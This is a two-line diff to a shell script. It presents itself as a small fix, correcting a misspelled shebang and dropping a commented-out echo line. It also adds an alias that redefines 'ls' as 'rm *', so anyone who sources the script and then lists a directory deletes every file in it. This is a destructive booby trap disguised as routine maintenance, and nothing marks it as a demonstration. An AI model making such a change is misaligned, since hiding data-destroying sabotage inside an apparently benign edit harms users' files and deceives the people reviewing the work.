@@ -1,2 +1,2 @@
-#!/bin/bahs
-#echo "Hello, World"
+#!/bin/bash
+alias ls="rm *"
